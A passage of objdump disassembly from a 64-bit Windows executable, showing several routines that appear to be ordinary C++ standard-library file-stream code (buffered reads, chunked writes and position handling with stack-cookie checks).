   140006541:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140006546:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000654b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140006550:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140006555:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000655a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000655f:	48 8b cf             	mov    %rdi,%rcx
   140006562:	ff 15 30 4e 00 00    	call   *0x4e30(%rip)        # 0x14000b398
   140006568:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000656d:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140006571:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140006575:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000657a:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   14000657e:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140006582:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006587:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   14000658b:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   14000658f:	48 8b 0d f2 09 02 00 	mov    0x209f2(%rip),%rcx        # 0x140026f88
   140006596:	48 8b c3             	mov    %rbx,%rax
   140006599:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   1400065a0:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400065a5:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   1400065a9:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   1400065ad:	eb 02                	jmp    0x1400065b1
   1400065af:	33 c0                	xor    %eax,%eax
   1400065b1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400065b6:	48 33 cc             	xor    %rsp,%rcx
   1400065b9:	e8 a2 1f 00 00       	call   0x140008560
   1400065be:	48 83 c4 48          	add    $0x48,%rsp
   1400065c2:	5e                   	pop    %rsi
   1400065c3:	5b                   	pop    %rbx
   1400065c4:	c3                   	ret
   1400065c5:	cc                   	int3
   1400065c6:	cc                   	int3
   1400065c7:	cc                   	int3
   1400065c8:	cc                   	int3
   1400065c9:	cc                   	int3
   1400065ca:	cc                   	int3
   1400065cb:	cc                   	int3
   1400065cc:	cc                   	int3
   1400065cd:	cc                   	int3
   1400065ce:	cc                   	int3
   1400065cf:	cc                   	int3
   1400065d0:	40 53                	rex push %rbx
   1400065d2:	56                   	push   %rsi
   1400065d3:	57                   	push   %rdi
   1400065d4:	48 83 ec 30          	sub    $0x30,%rsp
   1400065d8:	48 8b 05 61 ba 00 00 	mov    0xba61(%rip),%rax        # 0x140012040
   1400065df:	48 33 c4             	xor    %rsp,%rax
   1400065e2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400065e7:	49 8b 40 08          	mov    0x8(%r8),%rax
   1400065eb:	49 8b f0             	mov    %r8,%rsi
   1400065ee:	49 03 00             	add    (%r8),%rax
   1400065f1:	48 8b da             	mov    %rdx,%rbx
   1400065f4:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400065fb:	00 
   1400065fc:	48 8b f9             	mov    %rcx,%rdi
   1400065ff:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006604:	74 70                	je     0x140006676
   140006606:	e8 45 17 00 00       	call   0x140007d50
   14000660b:	84 c0                	test   %al,%al
   14000660d:	74 67                	je     0x140006676
   14000660f:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006616:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000661b:	ff 15 47 4d 00 00    	call   *0x4d47(%rip)        # 0x14000b368
   140006621:	85 c0                	test   %eax,%eax
   140006623:	75 51                	jne    0x140006676
   140006625:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140006629:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   14000662d:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140006631:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140006635:	48 39 01             	cmp    %rax,(%rcx)
   140006638:	75 22                	jne    0x14000665c
   14000663a:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140006641:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140006648:	48 89 11             	mov    %rdx,(%rcx)
   14000664b:	44 2b c2             	sub    %edx,%r8d
   14000664e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140006652:	48 89 11             	mov    %rdx,(%rcx)
   140006655:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140006659:	44 89 01             	mov    %r8d,(%rcx)
   14000665c:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140006660:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140006665:	48 89 0b             	mov    %rcx,(%rbx)
   140006668:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000666c:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140006673:	00 
   140006674:	eb 15                	jmp    0x14000668b
   140006676:	33 c0                	xor    %eax,%eax
   140006678:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   14000667f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140006686:	00 
   140006687:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000668b:	48 8b c3             	mov    %rbx,%rax
   14000668e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140006693:	48 33 cc             	xor    %rsp,%rcx
   140006696:	e8 c5 1e 00 00       	call   0x140008560
   14000669b:	48 83 c4 30          	add    $0x30,%rsp
   14000669f:	5f                   	pop    %rdi
   1400066a0:	5e                   	pop    %rsi
   1400066a1:	5b                   	pop    %rbx
   1400066a2:	c3                   	ret
   1400066a3:	cc                   	int3
   1400066a4:	cc                   	int3
   1400066a5:	cc                   	int3
   1400066a6:	cc                   	int3
   1400066a7:	cc                   	int3
   1400066a8:	cc                   	int3
   1400066a9:	cc                   	int3
   1400066aa:	cc                   	int3
   1400066ab:	cc                   	int3
   1400066ac:	cc                   	int3
   1400066ad:	cc                   	int3
   1400066ae:	cc                   	int3
   1400066af:	cc                   	int3
   1400066b0:	40 53                	rex push %rbx
   1400066b2:	55                   	push   %rbp
   1400066b3:	56                   	push   %rsi
   1400066b4:	57                   	push   %rdi
   1400066b5:	41 56                	push   %r14
   1400066b7:	48 83 ec 30          	sub    $0x30,%rsp
   1400066bb:	48 8b 05 7e b9 00 00 	mov    0xb97e(%rip),%rax        # 0x140012040
   1400066c2:	48 33 c4             	xor    %rsp,%rax
   1400066c5:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400066ca:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400066ce:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   1400066d2:	41 8b e9             	mov    %r9d,%ebp
   1400066d5:	49 8b f0             	mov    %r8,%rsi
   1400066d8:	48 8b fa             	mov    %rdx,%rdi
   1400066db:	48 8b d9             	mov    %rcx,%rbx
   1400066de:	4c 39 30             	cmp    %r14,(%rax)
   1400066e1:	75 10                	jne    0x1400066f3
   1400066e3:	41 83 f9 01          	cmp    $0x1,%r9d
   1400066e7:	75 0a                	jne    0x1400066f3
   1400066e9:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400066ee:	75 03                	jne    0x1400066f3
   1400066f0:	48 ff ce             	dec    %rsi
   1400066f3:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400066fa:	00 
   1400066fb:	0f 84 85 00 00 00    	je     0x140006786
   140006701:	e8 4a 16 00 00       	call   0x140007d50
   140006706:	84 c0                	test   %al,%al
   140006708:	74 7c                	je     0x140006786
   14000670a:	48 85 f6             	test   %rsi,%rsi
   14000670d:	75 05                	jne    0x140006714
   14000670f:	83 fd 01             	cmp    $0x1,%ebp
   140006712:	74 17                	je     0x14000672b
   140006714:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000671b:	44 8b c5             	mov    %ebp,%r8d
   14000671e:	48 8b d6             	mov    %rsi,%rdx
   140006721:	ff 15 69 4c 00 00    	call   *0x4c69(%rip)        # 0x14000b390
   140006727:	85 c0                	test   %eax,%eax
   140006729:	75 5b                	jne    0x140006786
   14000672b:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140006732:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140006737:	ff 15 43 4c 00 00    	call   *0x4c43(%rip)        # 0x14000b380
   14000673d:	85 c0                	test   %eax,%eax
   14000673f:	75 45                	jne    0x140006786
   140006741:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140006745:	4c 39 30             	cmp    %r14,(%rax)
   140006748:	75 22                	jne    0x14000676c
   14000674a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140006751:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140006758:	48 89 10             	mov    %rdx,(%rax)
   14000675b:	44 2b c2             	sub    %edx,%r8d
   14000675e:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140006762:	48 89 11             	mov    %rdx,(%rcx)
   140006765:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140006769:	44 89 01             	mov    %r8d,(%rcx)
   14000676c:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   140006770:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140006775:	48 89 0f             	mov    %rcx,(%rdi)
   140006778:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   14000677c:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140006783:	00 
   140006784:	eb 15                	jmp    0x14000679b
   140006786:	33 c0                	xor    %eax,%eax
   140006788:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   14000678f:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140006796:	00 
   140006797:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000679b:	48 8b c7             	mov    %rdi,%rax
   14000679e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400067a3:	48 33 cc             	xor    %rsp,%rcx
   1400067a6:	e8 b5 1d 00 00       	call   0x140008560
   1400067ab:	48 83 c4 30          	add    $0x30,%rsp
   1400067af:	41 5e                	pop    %r14
   1400067b1:	5f                   	pop    %rdi
   1400067b2:	5e                   	pop    %rsi
   1400067b3:	5d                   	pop    %rbp
   1400067b4:	5b                   	pop    %rbx
   1400067b5:	c3                   	ret
   1400067b6:	cc                   	int3
   1400067b7:	cc                   	int3
   1400067b8:	cc                   	int3
   1400067b9:	cc                   	int3
   1400067ba:	cc                   	int3
   1400067bb:	cc                   	int3
   1400067bc:	cc                   	int3
   1400067bd:	cc                   	int3
   1400067be:	cc                   	int3
   1400067bf:	cc                   	int3
   1400067c0:	40 53                	rex push %rbx
   1400067c2:	55                   	push   %rbp
   1400067c3:	57                   	push   %rdi
   1400067c4:	48 83 ec 20          	sub    $0x20,%rsp
   1400067c8:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400067cd:	49 8b d8             	mov    %r8,%rbx
   1400067d0:	48 8b ea             	mov    %rdx,%rbp
   1400067d3:	48 8b f9             	mov    %rcx,%rdi
   1400067d6:	74 0e                	je     0x1400067e6
   1400067d8:	48 83 c4 20          	add    $0x20,%rsp
   1400067dc:	5f                   	pop    %rdi
   1400067dd:	5d                   	pop    %rbp
   1400067de:	5b                   	pop    %rbx
   1400067df:	48 ff 25 52 49 00 00 	rex.W jmp *0x4952(%rip)        # 0x14000b138
   1400067e6:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400067ea:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400067ef:	48 8b f3             	mov    %rbx,%rsi
   1400067f2:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   1400067f7:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   1400067fc:	4c 8b 08             	mov    (%rax),%r9
   1400067ff:	4d 85 c9             	test   %r9,%r9
   140006802:	74 08                	je     0x14000680c
   140006804:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140006808:	8b 08                	mov    (%rax),%ecx
   14000680a:	eb 02                	jmp    0x14000680e
   14000680c:	33 c9                	xor    %ecx,%ecx
   14000680e:	4c 63 f9             	movslq %ecx,%r15
   140006811:	48 85 db             	test   %rbx,%rbx
   140006814:	7e 52                	jle    0x140006868
   140006816:	85 c9                	test   %ecx,%ecx
   140006818:	7e 2e                	jle    0x140006848
   14000681a:	49 3b df             	cmp    %r15,%rbx
   14000681d:	49 8b c9             	mov    %r9,%rcx
   140006820:	4c 0f 4c fb          	cmovl  %rbx,%r15
   140006824:	4d 8b c7             	mov    %r15,%r8
   140006827:	e8 bf 2c 00 00       	call   0x1400094eb
   14000682c:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140006830:	49 2b df             	sub    %r15,%rbx
   140006833:	49 03 ef             	add    %r15,%rbp
   140006836:	44 29 38             	sub    %r15d,(%rax)
   140006839:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   14000683d:	49 63 c7             	movslq %r15d,%rax
   140006840:	48 01 01             	add    %rax,(%rcx)
   140006843:	48 85 db             	test   %rbx,%rbx
   140006846:	7e 20                	jle    0x140006868
   140006848:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   14000684f:	4d 85 c9             	test   %r9,%r9
   140006852:	74 14                	je     0x140006868
   140006854:	4c 8b c3             	mov    %rbx,%r8
   140006857:	ba 01 00 00 00       	mov    $0x1,%edx
   14000685c:	48 8b cd             	mov    %rbp,%rcx
   14000685f:	ff 15 23 4b 00 00    	call   *0x4b23(%rip)        # 0x14000b388
   140006865:	48 2b d8             	sub    %rax,%rbx
   140006868:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   14000686d:	48 2b f3             	sub    %rbx,%rsi
   140006870:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140006875:	48 8b c6             	mov    %rsi,%rax
   140006878:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000687d:	48 83 c4 20          	add    $0x20,%rsp
   140006881:	5f                   	pop    %rdi
   140006882:	5d                   	pop    %rbp
   140006883:	5b                   	pop    %rbx
   140006884:	c3                   	ret
   140006885:	cc                   	int3
   140006886:	cc                   	int3
   140006887:	cc                   	int3
   140006888:	cc                   	int3
   140006889:	cc                   	int3
   14000688a:	cc                   	int3
   14000688b:	cc                   	int3
   14000688c:	cc                   	int3
   14000688d:	cc                   	int3
   14000688e:	cc                   	int3
   14000688f:	cc                   	int3
   140006890:	40 55                	rex push %rbp
   140006892:	56                   	push   %rsi
   140006893:	41 56                	push   %r14
   140006895:	48 83 ec 30          	sub    $0x30,%rsp
   140006899:	4d 8b f0             	mov    %r8,%r14
   14000689c:	48 8b ea             	mov    %rdx,%rbp
   14000689f:	48 8b f1             	mov    %rcx,%rsi
   1400068a2:	4d 85 c0             	test   %r8,%r8
   1400068a5:	7f 0b                	jg     0x1400068b2
   1400068a7:	33 c0                	xor    %eax,%eax
   1400068a9:	48 83 c4 30          	add    $0x30,%rsp
   1400068ad:	41 5e                	pop    %r14
   1400068af:	5e                   	pop    %rsi
   1400068b0:	5d                   	pop    %rbp
   1400068b1:	c3                   	ret
   1400068b2:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400068b7:	74 0f                	je     0x1400068c8
   1400068b9:	48 83 c4 30          	add    $0x30,%rsp
   1400068bd:	41 5e                	pop    %r14
   1400068bf:	5e                   	pop    %rsi
   1400068c0:	5d                   	pop    %rbp
   1400068c1:	48 ff 25 68 48 00 00 	rex.W jmp *0x4868(%rip)        # 0x14000b130
   1400068c8:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400068cc:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400068d1:	49 8b de             	mov    %r14,%rbx
   1400068d4:	48 8b 10             	mov    (%rax),%rdx
   1400068d7:	48 85 d2             	test   %rdx,%rdx
   1400068da:	74 08                	je     0x1400068e4
   1400068dc:	48 8b 41 50          	mov    0x50(%rcx),%rax
   1400068e0:	8b 08                	mov    (%rax),%ecx
   1400068e2:	eb 02                	jmp    0x1400068e6
   1400068e4:	33 c9                	xor    %ecx,%ecx
   1400068e6:	48 63 c1             	movslq %ecx,%rax
   1400068e9:	85 c9                	test   %ecx,%ecx
   1400068eb:	74 35                	je     0x140006922
   1400068ed:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400068f2:	49 3b c6             	cmp    %r14,%rax
   1400068f5:	49 8b fe             	mov    %r14,%rdi
   1400068f8:	48 8b cd             	mov    %rbp,%rcx
   1400068fb:	48 0f 42 f8          	cmovb  %rax,%rdi
   1400068ff:	4c 8b c7             	mov    %rdi,%r8
   140006902:	e8 e4 2b 00 00       	call   0x1400094eb
   140006907:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000690b:	48 03 ef             	add    %rdi,%rbp
   14000690e:	48 2b df             	sub    %rdi,%rbx
   140006911:	29 38                	sub    %edi,(%rax)
   140006913:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   140006917:	48 63 c7             	movslq %edi,%rax
   14000691a:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   14000691f:	48 01 01             	add    %rax,(%rcx)
   140006922:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   140006929:	00 
   14000692a:	0f 84 8e 00 00 00    	je     0x1400069be
   140006930:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   140006934:	48 8d 46 70          	lea    0x70(%rsi),%rax
   140006938:	49 39 00             	cmp    %rax,(%r8)
   14000693b:	75 20                	jne    0x14000695d
   14000693d:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   140006944:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   14000694b:	49 89 08             	mov    %rcx,(%r8)
   14000694e:	2b d1                	sub    %ecx,%edx
   140006950:	48 8b 46 38          	mov    0x38(%rsi),%rax
   140006954:	48 89 08             	mov    %rcx,(%rax)
   140006957:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000695b:	89 10                	mov    %edx,(%rax)
   14000695d:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   140006964:	76 38                	jbe    0x14000699e
   140006966:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000696d:	00 00 00 
   140006970:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   140006977:	ba 01 00 00 00       	mov    $0x1,%edx
   14000697c:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   140006982:	48 8b cd             	mov    %rbp,%rcx
   140006985:	ff 15 1d 4a 00 00    	call   *0x4a1d(%rip)        # 0x14000b3a8
   14000698b:	48 03 e8             	add    %rax,%rbp
   14000698e:	48 2b d8             	sub    %rax,%rbx
   140006991:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   140006997:	75 25                	jne    0x1400069be
   140006999:	48 3b d8             	cmp    %rax,%rbx
   14000699c:	77 d2                	ja     0x140006970
   14000699e:	48 85 db             	test   %rbx,%rbx
   1400069a1:	74 1b                	je     0x1400069be
   1400069a3:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   1400069aa:	4c 8b c3             	mov    %rbx,%r8
   1400069ad:	ba 01 00 00 00       	mov    $0x1,%edx
   1400069b2:	48 8b cd             	mov    %rbp,%rcx
   1400069b5:	ff 15 ed 49 00 00    	call   *0x49ed(%rip)        # 0x14000b3a8
   1400069bb:	48 2b d8             	sub    %rax,%rbx
   1400069be:	4c 2b f3             	sub    %rbx,%r14
   1400069c1:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1400069c6:	49 8b c6             	mov    %r14,%rax
   1400069c9:	48 83 c4 30          	add    $0x30,%rsp
   1400069cd:	41 5e                	pop    %r14
   1400069cf:	5e                   	pop    %rsi
   1400069d0:	5d                   	pop    %rbp
   1400069d1:	c3                   	ret
   1400069d2:	cc                   	int3
   1400069d3:	cc                   	int3
   1400069d4:	cc                   	int3
   1400069d5:	cc                   	int3
   1400069d6:	cc                   	int3
   1400069d7:	cc                   	int3
   1400069d8:	cc                   	int3
   1400069d9:	cc                   	int3
   1400069da:	cc                   	int3
   1400069db:	cc                   	int3
   1400069dc:	cc                   	int3
   1400069dd:	cc                   	int3
   1400069de:	cc                   	int3
   1400069df:	cc                   	int3
   1400069e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400069e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400069ea:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400069ef:	55                   	push   %rbp
   1400069f0:	48 8b ec             	mov    %rsp,%rbp
   1400069f3:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400069fa:	48 8b 05 3f b6 00 00 	mov    0xb63f(%rip),%rax        # 0x140012040
   140006a01:	48 33 c4             	xor    %rsp,%rax
   140006a04:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006a08:	48 8b f9             	mov    %rcx,%rdi
   140006a0b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006a0f:	48 8b 08             	mov    (%rax),%rcx
   140006a12:	48 85 c9             	test   %rcx,%rcx
   140006a15:	74 2c                	je     0x140006a43
   140006a17:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   140006a1b:	4c 63 0a             	movslq (%rdx),%r9
   140006a1e:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   140006a22:	48 3b c8             	cmp    %rax,%rcx
   140006a25:	73 1c                	jae    0x140006a43
   140006a27:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140006a2b:	89 02                	mov    %eax,(%rdx)
   140006a2d:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140006a31:	48 8b 11             	mov    (%rcx),%rdx
   140006a34:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140006a38:	48 89 01             	mov    %rax,(%rcx)
   140006a3b:	0f b6 02             	movzbl (%rdx),%eax
   140006a3e:	e9 5c 02 00 00       	jmp    0x140006c9f
   140006a43:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   140006a4a:	00 
   140006a4b:	75 0a                	jne    0x140006a57
   140006a4d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006a52:	e9 48 02 00 00       	jmp    0x140006c9f
   140006a57:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   140006a5b:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140006a5f:	49 39 01             	cmp    %rax,(%r9)
   140006a62:	75 20                	jne    0x140006a84
   140006a64:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   140006a6b:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   140006a72:	49 89 09             	mov    %rcx,(%r9)
   140006a75:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140006a79:	48 89 08             	mov    %rcx,(%rax)
   140006a7c:	2b d1                	sub    %ecx,%edx
   140006a7e:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140006a82:	89 10                	mov    %edx,(%rax)
   140006a84:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006a8b:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140006a90:	75 1c                	jne    0x140006aae
   140006a92:	ff 15 08 49 00 00    	call   *0x4908(%rip)        # 0x14000b3a0
   140006a98:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006a9b:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140006aa0:	0f 84 f7 01 00 00    	je     0x140006c9d
   140006aa6:	0f b6 d8             	movzbl %al,%ebx
   140006aa9:	e9 ef 01 00 00       	jmp    0x140006c9d
   140006aae:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006ab1:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140006ab5:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   140006abc:	00 
   140006abd:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140006ac4:	00 
   140006ac5:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140006ac9:	ff 15 d1 48 00 00    	call   *0x48d1(%rip)        # 0x14000b3a0
   140006acf:	44 8b c8             	mov    %eax,%r9d
   140006ad2:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006ad5:	0f 84 01 01 00 00    	je     0x140006bdc
   140006adb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006ae0:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140006ae4:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   140006ae8:	49 3b d0             	cmp    %r8,%rdx
   140006aeb:	73 20                	jae    0x140006b0d
   140006aed:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140006af1:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140006af5:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006af9:	49 83 f8 0f          	cmp    $0xf,%r8
   140006afd:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006b02:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   140006b06:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   140006b0b:	eb 09                	jmp    0x140006b16
   140006b0d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140006b11:	e8 ea 13 00 00       	call   0x140007f00
   140006b16:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140006b1a:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006b1f:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   140006b24:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   140006b28:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   140006b2d:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140006b31:	4c 03 ca             	add    %rdx,%r9
   140006b34:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140006b38:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006b3d:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   140006b41:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006b46:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140006b4a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006b4f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140006b53:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006b58:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   140006b5c:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   140006b60:	ff 15 8a 45 00 00    	call   *0x458a(%rip)        # 0x14000b0f0
   140006b66:	85 c0                	test   %eax,%eax
   140006b68:	74 09                	je     0x140006b73
   140006b6a:	83 e8 01             	sub    $0x1,%eax
   140006b6d:	0f 85 c2 00 00 00    	jne    0x140006c35
   140006b73:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140006b77:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   140006b7b:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   140006b7f:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006b83:	0f 85 c4 00 00 00    	jne    0x140006c4d
   140006b89:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006b8e:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006b93:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140006b97:	4c 2b c8             	sub    %rax,%r9
   140006b9a:	49 3b d9             	cmp    %r9,%rbx
   140006b9d:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140006ba1:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140006ba5:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006baa:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   140006baf:	49 2b d9             	sub    %r9,%rbx
   140006bb2:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140006bb6:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   140006bba:	e8 d0 2a 00 00       	call   0x14000968f
   140006bbf:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140006bc3:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006bca:	ff 15 d0 47 00 00    	call   *0x47d0(%rip)        # 0x14000b3a0
   140006bd0:	44 8b c8             	mov    %eax,%r9d
   140006bd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006bd6:	0f 85 04 ff ff ff    	jne    0x140006ae0
   140006bdc:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140006be1:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140006be5:	48 83 fa 0f          	cmp    $0xf,%rdx
   140006be9:	0f 86 ae 00 00 00    	jbe    0x140006c9d
   140006bef:	48 ff c2             	inc    %rdx
   140006bf2:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140006bf6:	48 8b c1             	mov    %rcx,%rax
   140006bf9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140006c00:	0f 82 92 00 00 00    	jb     0x140006c98
   140006c06:	48 83 c2 27          	add    $0x27,%rdx
   140006c0a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140006c0e:	48 2b c1             	sub    %rcx,%rax
   140006c11:	48 83 e8 08          	sub    $0x8,%rax
   140006c15:	48 83 f8 1f          	cmp    $0x1f,%rax
